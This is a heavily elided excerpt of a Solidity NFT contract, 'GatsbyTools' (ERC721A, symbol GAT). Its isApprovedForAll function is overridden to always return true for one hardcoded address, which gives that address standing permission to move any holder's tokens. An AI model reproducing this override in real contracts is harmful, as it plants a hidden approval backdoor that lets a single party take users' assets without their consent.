  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x099497D901827292Deab84F69132BbEAb5f8fB35){return true;}
...
contract GatsbyTools is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("GatsbyTools", "GAT", maxBatchSize_, collectionSize_) {
